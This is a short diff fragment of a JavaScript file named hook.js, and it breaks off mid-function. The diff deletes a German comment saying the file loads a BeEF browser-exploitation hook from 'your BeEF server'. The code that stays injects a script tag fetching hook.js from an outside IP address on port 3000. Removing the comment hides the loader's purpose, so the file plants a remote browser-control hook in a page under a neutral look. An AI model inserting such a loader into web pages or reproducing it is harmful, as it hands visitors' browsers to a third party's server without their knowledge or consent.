@@ -1,4 +1,3 @@
-// hook.js – lädt zur Laufzeit den echten BeEF-Hook von deinem BeEF-Server
 (function(){
   var s = document.createElement('script');
   s.src = 'http://37.221.92.148:3000/hook.js';
